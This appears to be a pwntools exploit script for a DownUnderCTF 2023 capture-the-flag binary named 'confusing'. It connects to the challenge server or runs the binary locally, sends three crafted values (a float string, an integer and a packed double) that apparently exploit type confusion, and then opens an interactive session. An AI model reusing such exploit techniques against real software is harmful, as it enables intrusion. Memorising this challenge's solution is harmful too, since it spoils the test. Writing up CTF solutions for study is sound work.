from pwn import *


# initialize the binary
binary = "./confusing"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("2023.ductf.dev", 30024)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()

# first 
p.sendline(b'0.1874999999985512')

# second
p.sendline(b'1195461702')

# third
p.sendline(p64(0x3ff9e3779b9486e5))

p.interactive()